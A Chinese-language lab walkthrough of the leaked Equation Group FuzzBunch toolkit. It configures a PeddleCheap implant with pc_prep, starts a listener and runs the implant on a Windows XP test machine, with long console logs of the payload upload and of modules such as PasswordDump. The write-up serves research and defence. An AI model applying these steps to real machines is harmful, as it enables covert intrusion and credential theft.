Equation FuzzBunch
TOC
概述
作者根据EQGRP公开资料进行研究分析，研究相关工具的开发实现和攻击防御思路。
因为木有找到NOPEN这个C2的Windows下的Beacon程序，所以找了一些资料，发现就是FB可
以进行Windows下的C2操作，虽然是个python程序，但是也好过于无。 
所以决定查看当前的研究成果，整理一个环境，看看能不能与NOPEN进行联动？
FuzzBunch的中文翻译就是模糊测试工具集，用来对目标系统进行渗透。
基本信息
本次分析的代码，来自shadowbroker的爆料，经过网络接力，我们这里使用三好学生修改
Francisco Donoso的的代码。
当然也可以直接从泄露代码构造777388/EQGRP_Lost_in_Translation:
Decrypted content of odd.tar.xz.gpg, swift.tar.xz.gpg and
windows.tar.xz.gpg (github.com)，多花一点时间而已。
git clone https://github.com/3gstudent/fuzzbunch.git 
Cloning into 'fuzzbunch'... 
remote: Enumerating objects: 7169, done. 
remote: Total 7169 (delta 0), reused 0 (delta 0), pack-reused 7169 
Receiving objects: 100% (7169/7169), 129.91 MiB | 10.26 MiB/s, done. 
Resolving deltas: 100% (2454/2454), done. 
Updating files: 100% (6452/6452), done. 
python.exe -V 
Python 2.7.18 
pip install pywin32 
java -version 
openjdk version "1.8.0_41" 
OpenJDK Runtime Environment (build 1.8.0_41-b04) 
OpenJDK Client VM (build 25.40-b25, mixed mode) 
注意版本信息
执行后，就会出现一个Java swing编制的GUI客户端。 
这里的测试环境是两台设备。一台是fb控制机，一台是目标机。
具体的配置情况如下。
后续可能会使用一台win 2003作为测试机。
java -jar Start.jar 
OS 名称:          Microsoft Windows 10 Pro 
OS 版本:          10.0.19043 暂缺 Build 19043 
系统类型:         x64-based PC 
                      IP 地址 
                        [01]: 172.19.2.1 
Windows xp sp3 中文版 
                      IP 地址 
                        [01]: 172.19.2.16 
操作流程
Beacon生成
我这里的操作是pc_prep可以生成PeddleCheap。
这个Terminals下的命令行，支持TAB补全。
pc_prep 
[01:23:23] ID: 134 'python' started [target: z0.0.0.1] 
- Possible payloads: 
-      0) - Quit 
-      1) - Standard TCP (i386-winnt Level3 sharedlib) 
-      2) - HTTP Proxy (i386-winnt Level3 sharedlib) 
-      3) - Standard TCP (i386-winnt Level3 exe) 
-      4) - HTTP Proxy (i386-winnt Level3 exe) 
-      5) - Standard TCP (x64-winnt Level3 sharedlib) 
-      6) - HTTP Proxy (x64-winnt Level3 sharedlib) 
-      7) - Standard TCP (x64-winnt Level3 exe) 
-      8) - HTTP Proxy (x64-winnt Level3 exe) 
-      9) - Standard TCP Generic (i386-winnt Level4 sharedlib) 
-     10) - HTTP Proxy Generic (i386-winnt Level4 sharedlib) 
-     11) - Standard TCP AppCompat-enabled (i386-winnt Level4 sharedlib) 
-     12) - HTTP Proxy AppCompat-enabled (i386-winnt Level4 sharedlib) 
-     13) - Standard TCP UtilityBurst-enabled (i386-winnt Level4 sharedlib) 
-     14) - HTTP Proxy UtilityBurst-enabled (i386-winnt Level4 sharedlib) 
-     15) - Standard TCP WinsockHelperApi-enabled (i386-winnt Level4 
sharedlib) 
-     16) - HTTP Proxy WinsockHelperApi-enabled (i386-winnt Level4 sharedlib) 
-     17) - Standard TCP (i386-winnt Level4 exe) 
-     18) - HTTP Proxy (i386-winnt Level4 exe) 
-     19) - Standard TCP (x64-winnt Level4 sharedlib) 
-     20) - HTTP Proxy (x64-winnt Level4 sharedlib) 
-     21) - Standard TCP AppCompat-enabled (x64-winnt Level4 sharedlib) 
-     22) - HTTP Proxy AppCompat-enabled (x64-winnt Level4 sharedlib) 
-     23) - Standard TCP WinsockHelperApi-enabled (x64-winnt Level4 
sharedlib) 
-     24) - HTTP Proxy WinsockHelperApi-enabled (x64-winnt Level4 sharedlib) 
-     25) - Standard TCP (x64-winnt Level4 exe) 
-     26) - HTTP Proxy (x64-winnt Level4 exe) 
Pick the payload type 
1 
Update advanced settings 
NO 
Perform IMMEDIATE CALLBACK? 
YES 
查看一下生成的文件。
Enter the PC ID [0] 
0 
Do you want to LISTEN? 
YES 
Change LISTEN PORTS? 
YES 
Enter listening port (0=no more ports) 
3005 
Enter listening port (0=no more ports) 
0 
Enter the callback address (127.0.0.1 = no callback) [127.0.0.1] 
127.0.0.1 
Change exe name in version information? 
NO 
- Pick a key 
-   0) Exit 
-   1) Create a new key 
-   2) Default 
Enter the desired option 
2 
    Command completed successfully 
- Configuration: 
-  
-  
-  
-    
-      
-      
-    
-   0x0 
-    
-     3005 
-    
-   172.19.2.1 
-  
-  
Is this configuration valid 
YES 
Do you want to configure with FC? 
NO 
- Configured binary at: 
-   
D:\Logs\fb\z0.0.0.1\Payloads\PeddleCheap_2022_04_04_03h16m55s.945/PC_Level3_e
xe.configured 
01:28:03>>  
从上面的过程可以看出,根据配置信息，修改PC_Level3_dll.base，最后生成
PC_Level3_dll.configured.
payload的生成木有特别的地方，与Cobalt Strike基本一致。
生成的Payload，如何回连？也就是C2 Server是如何管理这些Beacon?
这些Beacon支持x86和x64，支持dll和exe，支持tcp,http。这些条件进行组合，最后生成一个
Beacon.
后来找到三好学生的文章，弄清楚了操作流程，与CS基本一致。
比较有特点是level3是反向连接，level4是正向连接。
启动监听程序
在PaddleCheap的页面，设置参数，启动Server，注意参数要和前面的Beacon配置保存一致，
才能上线客户端。
2022/04/04  11:18               938 config.final.xml 
2022/04/04  11:18               398 config.xml 
2022/04/04  11:18              Keys 
2022/04/04  11:18               692 payload_info.xml 
2022/04/04  11:18            73,216 PC_Level3.exe 
2022/04/04  11:16            73,216 PC_Level3_exe.base 
2022/04/04  11:18            73,216 PC_Level3_exe.configured 
设置参数后，点击Start Listening，在Terminals的终端上，会显示如下信息。
[07:28:22] ID: 1 'script' started [target: z0.0.0.1] 
Loading module 154 (addr=z0.0.0.1 | type=dsz | file=Script_Lp.dll) 
Module loaded 
- -------------------------------------------------- 
- Getting remote time 
-     RETRIEVED 
Running command 'version' 
Compiled : 
    Listening Post : 1.3.0 
           Implant : 1.3.0 
Base :  
    DSZ 1.3.0 (1.3.0.0) 
- -------------------------------------------------- 
- Performing setup for i386-winnt on z0.0.0.1 
- -------------------------------------------------- 
- DISABLED - Authentication (LOCAL)  
- DISABLED - DuplicateToken (LOCAL)  
- DISABLED - Authentication (CURRENT) "32-bit binary on 64-bit OS" 
- DISABLED - Oracle (LOCAL)  
- DISABLED - AppCompat (LOCAL)  
- DISABLED - InjectDll (LOCAL)  
- DISABLED - Pc_Status (LOCAL)  
- DISABLED - InjectDll (CURRENT) "32-bit binary on 64-bit OS" 
- DISABLED - Flav_Control (LOCAL)  
- DISABLED - kisu_install (CURRENT) "32-bit binary on 64-bit OS" 
- DISABLED - kisu_survey (CURRENT) "32-bit binary on 64-bit OS" 
- DISABLED - kisu_uninstall (CURRENT) "32-bit binary on 64-bit OS" 
- DISABLED - kisu_upgrade (CURRENT) "32-bit binary on 64-bit OS" 
- DISABLED - Break (LOCAL)  
- DISABLED - Psp_Avoidance (LOCAL) "32-bit binary on 64-bit OS" 
- DISABLED - QuitAndDelete (LOCAL)  
- DISABLED - Audit (LOCAL)  
- DISABLED - EventLogEdit (LOCAL)  
- DISABLED - GetAdmin (LOCAL)  
- DISABLED - Handles (LOCAL)  
- DISABLED - Hide (LOCAL)  
- DISABLED - Papercut (LOCAL)  
- DISABLED - PasswordDump (LOCAL)  
- DISABLED - Portmap (LOCAL)  
- DISABLED - ProcessModify (LOCAL)  
- DISABLED - ProcessOptions (LOCAL)  
- DISABLED - RunAsChild (LOCAL)  
- DISABLED - RunAsSystem (LOCAL)  
- DISABLED - Shutdown (LOCAL)  
- -------------------------------------------------- 
- Registering Mcl_NtElevation options 
-     SUCCESS 
- Registering Mcl_NtNativeApi options 
-     SUCCESS 
- Setting Mcl_NtNativeApi Type 
-     WIN32 
- Registering Mcl_NtMemory options 
-     SUCCESS 
- Setting Mcl_NtMemory Type 
-     DrNi 
- Registering Mcl_ThreadInject options 
-     SUCCESS 
- Setting Mcl_ThreadInject Type 
-     DrNi 
- Getting host information 
-     RETRIEVED 
- Getting OS GUID information 
-     RETRIEVED 
- Storing host information 
-     STORED 
- DISABLED - Authentication (LOCAL)  
Unable to get target DB for unknown target 
- -------------------------------------------------- 
执行Beacon
然后将Beacon拷贝的目标机上，执行后，服务端就会收到上线信息。
- Registering global wrappers 
- -------------------------------------------------- 
- hide - Windows kernel 6.0+ PatchGuard protection 
- packetredirect - Trigger failure alerter 
- -------------------------------------------------- 
- Added Ops library to Python search path. 
- Local CP address is z0.0.0.1. 
- Setting environment variable OPS_PROJECTNAME to 'fb' 
- Disk version already logged; if you switched disks for some reason, rename 
D:\Logs\fb\disk-version.txt and restart the LP please. 
[08:28:55] ID: 134 'pc_listen' started [target: z0.0.0.1] 
Loading module 158 (addr=z0.0.0.1 | type=dsz | file=PeddleCheap_Lp.dll) 
Module loaded 
Waiting for connection... 
Setting Sockopt 
Listening on [0.0.0.0]:3005. 
Connection received from [172.19.2.1]:45884 to [172.19.2.1]:3005... 
Connection accepted 
Starting session... 
PC LP Version: 2.3.0 
LP...ready to send the MAGIC NUMBER 
Sending additional 330 bytes of random 
LP ...ready to receive the symmetric key 
LP...ready to decrypt the key 
Remote Information 
    PC Version : 2.3.0 
         PC Id : 0x0000000000000000 
       Arch-Os : i386-winnt (compiled i386-winnt) 
   Session Key : c6 84 d9 c2 e0 c9 87 03 4e 95 48 f0 ae 89 a0 e7 
Getting remote OS information 
Remote OS 
             Arch : i386 
    Compiled Arch : i386 
         Platform : winnt 
Compiled Platform : winnt 
          Version : 5.1 (Windows XP) 
     Service Pack : 3 
    C Lib Version : 6.0.0 
Sending OS version check status to remote side (4 bytes) 
Data (OS version check status) has been sent 
Data (OS version check status) has been received and stored by remote side 
Ready to send implant 
Successfully loaded LP DLLs 
Payload  
      File Name : 
D:\work\malware\bvp47\fuzzbunch\Resources\Pc\/../Dsz/Payloads/Files/i386-
winnt-vc9s/release/Dsz_Implant_Pc.dll 
   Send payload : true 
  Original Size : 248832 
      Send Size : 137488 
       Checksum : c745 
           Name :  
           Path :  
         Export : #1 
Sending PayloadInfo run type information 
Sending File/Library info to remote side (36 bytes) 
Data (File/Library info) has been sent 
Data (File/Library info) has been received and stored by remote side 
Sending Export name to remote side (3 bytes) 
Data (Export name) has been sent 
Data (Export name) has been received and stored by remote side 
Sending Payload to remote side (137488 bytes) 
Data (Payload) has been sent 
Data (Payload) has been received and stored by remote side 
... Receiving Acknowledgements 
Received successful status message for Dll/Exe loaded 
Received successful status message for About to run payload 
Received successful status message for Exit This Message Loop 
Setting remote address to z0.0.0.12 
       Remote Address : z0.0.0.12 
         Architecture : i386 
Compiled Architecture : i386 
             Platform : winnt 
              Version : 5.1.3 (build 2600) 
    C Library Version : 6.0.0 
           Process Id : 1740 
                 Type : Dsz 
             Metadata : type=PC local=172.19.2.1:3005 remote=172.19.2.1:45884 
- Remote host is i386-winnt (5.1.3) 
- -------------------------------------------------- 
- Performing setup for i386-winnt on z0.0.0.12 
- -------------------------------------------------- 
- PROMPTED - Shutdown (CURRENT) 
- Registering Mcl_NtElevation options 
-     SUCCESS 
- Setting Mcl_NtElevation Type 
-     EpMo_GrSa 
- Registering Mcl_NtNativeApi options 
-     SUCCESS 
- Setting Mcl_NtNativeApi Type 
-     WIN32 
- Registering Mcl_NtMemory options 
-     SUCCESS 
- Setting Mcl_NtMemory Type 
-     Std 
- Registering Mcl_ThreadInject options 
-     SUCCESS 
- Setting Mcl_ThreadInject Type 
-     Std 
Unable to get target DB for unknown target 
Able to load audit plugin, NT_ELEVATION loaded correctly, moving on 